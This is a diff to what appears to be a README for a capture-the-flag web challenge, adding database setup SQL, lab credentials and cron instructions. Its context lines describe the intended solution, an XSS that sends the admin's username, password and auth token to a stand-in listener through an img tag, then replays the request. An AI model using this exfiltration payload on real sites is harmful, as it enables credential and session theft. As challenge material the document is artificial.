@@ -31,3 +31,72 @@ My BIGGEST recommendation is to use https://gist.github.com/. Once there they ca
 Once grabbed, it will then send it to a page that listens for any request and grabs the parameters. ( We might want to provide this ). To send it out, the easiest method is to bind it with an img tag. \<img src="https://mysecretwebsite.ioo/receive?user=admin&password=yadada&authToken=1234567">. 
 
 Once received, they emulate that same request on the web page and get the new page, an admin page that contains the number. It only works on verified login, so they can't bypass this any other way. 
+
+
+
+# Setup
+
+Import the following SQL to setup
+```
+# ************************************************************
+# Sequel Pro SQL dump
+# Version 4541
+#
+# http://www.sequelpro.com/
+# https://github.com/sequelpro/sequelpro
+#
+# Host: 127.0.0.1 (MySQL 5.5.46-0ubuntu0.14.04.2)
+# Database: challenge
+# Generation Time: 2016-12-09 20:33:41 +0000
+# ************************************************************
+
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
+
+
+# Dump of table login
+# ------------------------------------------------------------
+
+DROP TABLE IF EXISTS `login`;
+
+CREATE TABLE `login` (
+  `username` varchar(30) NOT NULL DEFAULT '',
+  `password` text NOT NULL,
+  `authToken` text NOT NULL,
+  `handle` varchar(200) NOT NULL DEFAULT '',
+  `created` datetime NOT NULL,
+  PRIMARY KEY (`username`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+
+LOCK TABLES `login` WRITE;
+/*!40000 ALTER TABLE `login` DISABLE KEYS */;
+
+INSERT INTO `login` (`username`, `password`, `authToken`, `handle`, `created`)
+VALUES
+	('thebestadmin','$2y$10$129139293012312093210u1xpEeTfbT5Yeixf3KSdSAv/BgFs4Qsq','7da7e821a5b8ee25e8f42b56d573f0cc','notyourbusiness','2016-12-09 19:36:34');
+
+/*!40000 ALTER TABLE `login` ENABLE KEYS */;
+UNLOCK TABLES;
+
+
+
+/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
+/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
+/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+```
+
+There needs to exist a `login` user with password: `Password1` that has the following permissions: `SELECT, INSERT, UPDATE`
+to the `login` table, which exists in the `challenge` database.
+
+The above script includes the login credentials so you'll be good.
+
+As for the cron. go to the `cronadmin` folder and npm install. Have the cron run `node index.js` and ensure it works. If it doesn't, login as the admin to get an authtoken logged by going into the website and logging in as `thebestadmin` `securepassword1`. Once there it should create a file named `authTokenStorage.txt` which contains the authToken (I'm lazy, okay?)
